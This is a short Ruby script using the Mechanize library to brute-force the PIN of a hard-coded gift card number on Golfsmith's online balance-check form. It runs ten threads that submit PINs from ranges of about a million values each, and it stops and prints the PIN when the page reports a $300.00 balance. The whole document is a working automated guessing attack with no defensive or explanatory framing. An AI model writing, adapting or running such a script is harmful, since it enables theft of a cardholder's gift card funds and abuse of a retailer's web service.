require 'rubygems'
require 'mechanize'
GOLFSMITH_NUM = '6101218734329022'

def check(x,y)
  (x..y).each do |n|
    def start_url
      return 'http://www.golfsmith.com/giftcard_balance.php'
    end

    url = start_url()
    agent = Mechanize.new { |agent|
      agent.user_agent_alias = 'Mac Safari'
    }

    # Get the start page
    start_page = agent.get(url)

    # Check balance form
    balance_form = start_page.form_with :name => "gc_bal"

    balance_form["giftcard_number"] = GOLFSMITH_NUM

    balance_form["pin"] = n

    balance_page = balance_form.submit

    balance = balance_page.search("span.largetext").text

    if balance == "Your Balance:$300.00"
      puts "success"
      puts balance_form["pin"]
      break
    else
      print n
      puts " fail"
    end
  end
end

t1 = Thread.new { check(99002000,99999999) }
t2 = Thread.new { check(98002000,98999999) }
t3 = Thread.new { check(97002000,97999999) }
t4 = Thread.new { check(96002000,96999999) }
t5 = Thread.new { check(95002000,95999999) }
t6 = Thread.new { check(94002000,94999999) }
t7 = Thread.new { check(93002000,93999999) }
t8 = Thread.new { check(92002000,92999999) }
t9 = Thread.new { check(91002000,91999999) }
t10 = Thread.new { check(90002000,90999999) }
t1.join
t2.join
t3.join
t4.join
t5.join
t6.join
t7.join
t8.join
t9.join
t10.join